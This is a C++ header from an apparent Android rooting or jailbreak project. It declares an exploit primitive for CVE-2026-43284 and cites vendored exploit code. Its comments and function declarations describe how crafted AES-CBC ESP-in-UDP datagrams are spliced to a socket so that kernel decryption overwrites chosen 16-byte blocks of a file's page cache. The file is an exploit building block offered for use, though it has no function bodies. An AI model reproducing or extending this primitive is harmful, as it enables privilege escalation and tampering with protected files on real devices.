#ifndef GHOSTLOCK_BACKEND_CVE_2026_43284_IPSEC_IPSEC_HPP
#define GHOSTLOCK_BACKEND_CVE_2026_43284_IPSEC_IPSEC_HPP

/* CVE-2026-43284 IpSec/ESP primitive (B5-2).
 *
 * Mapping to the vendored sources and the project idioms is in
 * docs/analysis/cve-2026-43284-refactor-plan.md:
 *   DirtyFrag-Android-Root-Jailbreak@de2ab7b usermode/ankit/exp.c (compute_iv, do_one_write_cbc,
 *     patch_file_cbc)
 *   DirtyInit@3409c35 dfi_exploit.c (compatibility)
 *
 * The primitive is AES-256-CBC ESP-in-UDP. One ESP datagram writes exactly one
 * 16-byte file page-cache block:
 *   IV = AES256_ECB_DEC(K, old_content) XOR desired
 * so the kernel CBC decryption yields the desired block. There is no race, no
 * KASLR and no kernel address; this module is pure and host-testable. */

#include <array>
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43284 {

    /* Runtime SA parameters produced by the App IpSecManager. These are session
     * secrets: they must never reach profile::Document, a serialized profile, a
     * log or argv. They arrive through the runtime channel (plan section 6,
     * scheme B) and are zeroized at teardown. */
    struct IpsecSaParams final {
        std::uint32_t spi = 0;
        std::uint16_t encap_port = 0;
        std::uint16_t sender_port = 0;
        std::uint8_t icv_len = 16;
        std::array<std::uint8_t, 32> aes_key{};
        std::array<std::uint8_t, 32> hmac_key{};
    };

    inline constexpr std::size_t kEspHeaderBytes = 8;  /* SPI(4) + Seq(4) */
    inline constexpr std::size_t kEspIvBytes = 16;
    inline constexpr std::size_t kEspBlockBytes = 16;
    inline constexpr std::size_t kEspIcvBytes = 16;    /* HMAC-SHA256, 128-bit */
    inline constexpr std::size_t kEspDatagramBytes =
            kEspHeaderBytes + kEspIvBytes + kEspBlockBytes + kEspIcvBytes;

    /* ESP truncates the 32-byte HMAC-SHA256 to icv_len bytes. */
    inline constexpr std::size_t kEspIcvMaxBytes = 32;

    /* Byte offsets inside the ESP-in-UDP datagram. In transport mode there is
     * no extra UDP header: the sender splice()s this payload straight to the
     * connected UDP socket, so the SPIs/IV/ciphertext/ICV are contiguous. The
     * layout is SPI(4) | Seq(4) | IV(16) | Ciphertext(16) | ICV(icv_len). */
    inline constexpr std::size_t kEspSpiOffset = 0;
    inline constexpr std::size_t kEspSeqOffset = 4;
    inline constexpr std::size_t kEspIvOffset = 8;
    inline constexpr std::size_t kEspCiphertextOffset = 24;
    inline constexpr std::size_t kEspIcvOffset = 40;

    /* IV = AES256_ECB_DEC(aes_key, old_content) XOR desired. When the ciphertext
     * is old_content, the peer/kernel CBC decryption recovers desired. */
    void compute_cbc_iv(const std::uint8_t old_content[16],
                        const std::uint8_t desired[16],
                        const std::uint8_t aes_key[32],
                        std::uint8_t iv_out[16]) noexcept;

    /* Datagram size for a truncated ICV of icv_len bytes, or 0 when icv_len is
     * outside [1, kEspIcvMaxBytes]. */
    [[nodiscard]] std::size_t esp_datagram_bytes(std::size_t icv_len) noexcept;

    /* Writes the truncated ICV = HMAC-SHA256(sa.hmac_key,
     * header8 || iv16 || ciphertext16)[0, sa.icv_len). Returns the number of
     * bytes written, or 0 on a bad icv_len, a null pointer or too-small
     * capacity. */
    [[nodiscard]] std::size_t esp_compute_icv(const IpsecSaParams &sa,
                                              const std::uint8_t header[8],
                                              const std::uint8_t iv[16],
                                              const std::uint8_t ciphertext[16],
                                              std::uint8_t *icv_out,
                                              std::size_t icv_capacity) noexcept;

    /* Serializes one complete ESP-in-UDP datagram (SPI, seq, IV, ciphertext and
     * truncated ICV). SPI and seq are big-endian. Returns the datagram length,
     * or 0 on a bad sa.icv_len, a null pointer or too-small capacity. */
    [[nodiscard]] std::size_t esp_build_datagram(const IpsecSaParams &sa,
                                                 std::uint32_t seq,
                                                 const std::uint8_t iv[16],
                                                 const std::uint8_t ciphertext[16],
                                                 std::uint8_t *out,
                                                 std::size_t out_capacity) noexcept;

    /* Constant-time verification of a complete datagram's truncated ICV.
     * Returns false on a bad length, a null datagram or a mismatch. */
    [[nodiscard]] bool esp_verify_datagram(const IpsecSaParams &sa,
                                           const std::uint8_t *datagram,
                                           std::size_t datagram_len) noexcept;

    /* Kernel-side CBC decryption of one ESP ciphertext block. Provided so the
     * IV identity can be exercised end to end on the host. Returns false on a
     * null pointer. */
    [[nodiscard]] bool esp_decrypt_block(const std::uint8_t aes_key[32],
                                         const std::uint8_t iv[16],
                                         const std::uint8_t ciphertext[16],
                                         std::uint8_t plaintext[16]) noexcept;

    /* Byte-range wipe with the same non-elidable volatile-store semantics as
     * zeroize(IpsecSaParams&). Used on key schedules and MAC scratch as well as
     * on the SA itself; callers must ensure the range is a live object. */
    void zeroize_bytes(void *data, std::size_t len) noexcept;

    /* explicit_bzero wrapper. Must run on every path that drops an
     * IpsecSaParams value (state destruction, decode rejection). */
    void zeroize(IpsecSaParams &sa) noexcept;

} // namespace ghostlock::backend::cve_2026_43284

#endif
